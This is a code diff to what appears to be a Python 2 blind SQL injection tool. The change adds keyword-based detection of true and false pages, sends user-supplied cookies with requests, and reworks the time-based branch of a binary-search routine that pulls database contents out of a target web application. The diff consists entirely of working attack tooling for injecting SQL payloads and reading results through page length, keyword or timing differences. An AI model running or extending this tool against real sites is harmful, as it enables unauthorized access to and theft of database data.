@@ -9,8 +9,7 @@ p.add_argument( '-p' , '--post'    , metavar = 'POST'         , help = 'to send 
 p.add_argument( '-c' , '--cookie'  , metavar = 'COOKIE'       , help = 'cookie to send with POST or GET'      )
 p.add_argument( '-r' , '--referer' , metavar = 'REFERER'      , help = 'Referer header in request'            )
 p.add_argument( '-a' , '--avoid'   , default = ''             , help = 'string of characters wich should be avoided in sql queries'   )
-p.add_argument( '-f' , '--filters' , default = ['q'], nargs = '+',    help = 'filters to apply to payload before injection at >><< place;' +\
-                                                                             'possible values: (q - quote; qp - quote_plus)' )
+p.add_argument( '-f' , '--filters' , default = ['q'], nargs = '+',    help = 'filters to apply to payload before injection at >><< place; possible values: (q - quote; qp - quote_plus)' )
 p.add_argument( '-t' , '--sleep'   , metavar = 'SECONDS', type = int, help = 'Time to sleep between requests' )
 p.add_argument( '-v' , '--verbose' , action  = 'append_const' , const = 1, default = []  , help = 'how much verbose should be output' )
 p.add_argument( '-E' , '--engine'  , default = 'mysql', choices = ['mysql', 'postgres']  , help = 'engine of database'  )
@@ -68,11 +67,11 @@ class API( object ):
                 if self.a.referer:
                     heads[ 'Referer' ] = self.a.referer
 
+                if cookie:
+                    heads[ 'Cookie' ] = cookie
 
                 o = urllib2.build_opener( )
                 r = urllib2.Request( get, post, heads )
-                if cookie:
-                    pass
 
                 code, html = None, ""
                 try:
@@ -130,10 +129,11 @@ class API( object ):
         return ( code, html )
 
 
-    def codes( self, val = r'\1' ):
+    def codes( self, val = r'\1', word = None ):
         """ return:
             code             : code for url ( 200, 404, 401 ... )
             lcnt, wcnt, ccnt : line, word and char counts for page
+            dt, kw           : time of page loading and keyword availability
         """
         dt = time.time()
         ccnt, wcnt, lcnt = None, None, None
@@ -144,7 +144,7 @@ class API( object ):
             lcnt = len( h.split('\n') )
 
         dt = time.time() - dt  ## how long is request time ?
-        return c, lcnt, wcnt, ccnt, dt
+        return c, lcnt, wcnt, ccnt, dt, word and ( word in h )
 
     def html( self, val = r'\1' ):
         if self.a.sleep:
@@ -301,7 +301,7 @@ class DBlind( API ):
             tsss = sql.prepare( tsss )                      ## TODO: warn!!! possible bugs ??
             self.log( 2, '[D] testing: %s' % tsss )
 
-            _, l, _, _, dt = self.codes( tsss )
+            _, l, _, _, dt, kw = self.codes( tsss, self.a.string )
             
 
             if self.a.ftime:     ## time based SQLi
@@ -310,6 +310,13 @@ class DBlind( API ):
                     s, e = m + 1, e
                 else:
                     self.log( 2, '[D] answer time = %s sec. --> TRUE' %dt )
+                    s, e = s, m
+            elif self.a.string:  ## usual blind SQLi (but keyword provided)
+                if not kw:
+                    self.log( 2, '[D] NO keyword --> FALSE' )
+                    s, e = m + 1, e
+                else:
+                    self.log( 2, '[D] FOUND keyword --> TRUE' )
                     s, e = s, m
             else:                ## usual blind SQLi
                 if l == self.l404:
@@ -339,22 +346,28 @@ class DBlind( API ):
 
 
     def run( self ):
-        t1 = self.codes( '2*2=4' )
-        t2 = self.codes( '2*2=5' )
-        if not self.a.ftime:
+        t1 = self.codes( '2*2=4', self.a.string )
+        t2 = self.codes( '2*2=5', self.a.string )
+        if self.a.ftime:
+            self.log( 0, '[i] testing for TRUE/FALSE pages for time based SQLi...' )
+            self.log( 0, '[i] codes for TRUE  page --> ( c = %4s, l = %5s, w = %5s, c = %5s, [time = %s], KW = %s )' % t1 )
+            self.log( 0, '[i] codes for FALSE page --> ( c = %4s, l = %5s, w = %5s, c = %5s, [time = %s], KW = %s )' % t2 )
+            if not ( t1[ -2 ] < t2[ -2 ] and t2[ -2 ] > self.a.ftime ):
+                self.err( '[!] can\'t determine TRUE/FALSE page by time' )
+        elif self.a.string:
+            self.log( 0, '[i] testing for TRUE/FALSE pages by "%s" keyword...' % self.a.string )
+            self.log( 0, '[i] codes for TRUE  page --> ( c = %4s, l = %5s, w = %5s, c = %5s, time = %s, [KW = %s] )' % t1 )
+            self.log( 0, '[i] codes for FALSE page --> ( c = %4s, l = %5s, w = %5s, c = %5s, time = %s, [KW = %s] )' % t2 )
+            if t1[ -1 ] == t2[ -1 ]:
+                self.err( '[!] both page contains OR both page miss the keyword "%s"' % self.a.string )
+        else:
             self.log( 0, '[i] testing for TRUE/FALSE pages taking only lines count values...' )
-            self.log( 0, '[i] codes for TRUE  page --> ( c = %4s, [l = %5s], w = %5s, c = %5s, time = %s )' % t1 )
-            self.log( 0, '[i] codes for FALSE page --> ( c = %4s, [l = %5s], w = %5s, c = %5s, time = %s )' % t2 )
+            self.log( 0, '[i] codes for TRUE  page --> ( c = %4s, [l = %5s], w = %5s, c = %5s, time = %s, KW = %s )' % t1 )
+            self.log( 0, '[i] codes for FALSE page --> ( c = %4s, [l = %5s], w = %5s, c = %5s, time = %s, KW = %s )' % t2 )
             self.l200 = t1[ 1 ]   ## count of lines for normal answer
             self.l404 = t2[ 1 ]   ## count of lines for error/404 answer
             if self.l200 == self.l404:
                 self.err( '[!] count for true and fales pages are equal! (%s == %s)' % (self.l200, self.l404) )
-        else:
-            self.log( 0, '[i] testing for TRUE/FALSE pages for time based SQLi...' )
-            self.log( 0, '[i] codes for TRUE  page --> ( c = %4s, l = %5s, w = %5s, c = %5s, [time = %s] )' % t1 )
-            self.log( 0, '[i] codes for FALSE page --> ( c = %4s, l = %5s, w = %5s, c = %5s, [time = %s] )' % t2 )
-            if not ( t1[ -1 ] < t2[ -1 ] and t2[ -1 ] > self.a.ftime ):
-                self.err( '[!] can\'t determine TRUE/FALSE page by time' )
 
         API.run( self )       ## call standart process of retrieving SQL
 
